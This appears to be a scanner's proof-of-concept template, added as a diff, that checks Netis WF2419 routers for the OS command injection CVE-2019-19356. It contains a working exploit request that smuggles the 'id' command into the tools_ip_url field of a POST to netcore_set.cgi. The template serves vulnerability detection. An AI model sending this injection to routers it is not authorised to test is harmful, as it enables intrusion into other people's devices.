@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "通过向 Netis WF2419 路由器 /cgi-bin-igd/netcore_set.cgi 发送特制 POST 请求，在 tools_ip_url 参数中注入系统命令，检测目标是否存在 OS 命令注入漏洞"
+id = "POC-AVE-2019-1009"
+name = "Netis WF2419 路由器远程代码执行漏洞 PoC"
+severity = "high"
+tags = ["cve-2019-19356"]
+vuln_id = [
+    "CVE-2019-19356",
+    "AVE-2019-1009",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin-igd/netcore_set.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "mode_name=netcore_set&tools_type=2&tools_ip_url=|+id&tools_cmd=1&net_tools_set=1&wlan_idx_num=0"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SUCCESS"]
